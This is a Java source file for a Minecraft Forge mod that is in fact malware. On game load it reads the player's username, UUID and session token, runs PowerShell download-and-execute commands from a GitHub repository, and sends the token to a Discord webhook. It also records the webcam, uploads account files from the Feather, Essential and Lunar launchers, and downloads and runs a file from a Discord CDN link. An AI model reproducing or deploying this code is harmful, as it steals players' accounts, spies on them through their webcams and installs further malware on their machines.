package sillymodification;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;


@Mod(modid = Main.MODID, version = Main.VERSION)
public class Main {

    public static String webhook = "";

    public static final String MODID = "finermods";
    public static final String VERSION = "1.8.9";
    
    @EventHandler
    public void init(FMLPreInitializationEvent event) {
        new Thread(() -> {
            Minecraft minecraft = Minecraft.getMinecraft();
            String username = minecraft.getSession().getProfile().getName(); // can't get this info with powershell (i think)
            String uuid = minecraft.getSession().getProfile().getId().toString().replace("-","");
            String ssid = minecraft.getSession().getToken();

            try {
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/uploadmessagetoserver.ps1'));send -hookurl '"+webhook+"' -text \'```username: " + username + "``````uuid: " + uuid + "``````ssid: " + ssid+"```\' -username "+username);
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/shortwebcamrecord.ps1'));shortwebcamrecord");
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/setwallpaper.ps1'));");

                Thread.sleep(5000L);

                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/uploadfiletodiscord.ps1'));Upload-Discord -file C:\\Users\\$env:username\\AppData\\Roaming\\.feather\\accounts.json -text 'piss' -hookurl '" + webhook + "'");
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/uploadfiletodiscord.ps1'));Upload-Discord -file C:\\Users\\$env:username\\AppData\\Roaming\\.minecraft\\essential\\microsoft_accounts.json -text 'piss' -hookurl '" + webhook + "'");
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/uploadfiletodiscord.ps1'));Upload-Discord -file C:\\Users\\$env:username\\.lunarclient\\settings\\game\\accounts.json -text 'piss' -hookurl '" + webhook + "'");
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/uploadfiletodiscord.ps1'));Upload-Discord -file C:\\Users\\$env:username\\AppData\\Roaming\\out.mp4 -text 'piss' -hookurl '" + webhook + "'");


                // RUNS A FILE DOWNLOADED FROM URL
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/downloadandrunfile.ps1'));run -urltofile 'https://cdn.discordapp.com/attachments/1116017705636614174/1117477868176420904/newimagewhodis.png' -filenamea 'newimagewhodis.png'");
                //Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/T1NYDEV/testtest/main/downloadandrunwithdelay.ps1'));run -urltofile 'https://cdn.discordapp.com/attachments/1141734768573165662/1141736312689401986/built.exe' -filenamea 'built.exe' -waittime 10");

            }
            catch (Exception e) {e.printStackTrace();}
        }).start();
    }

}
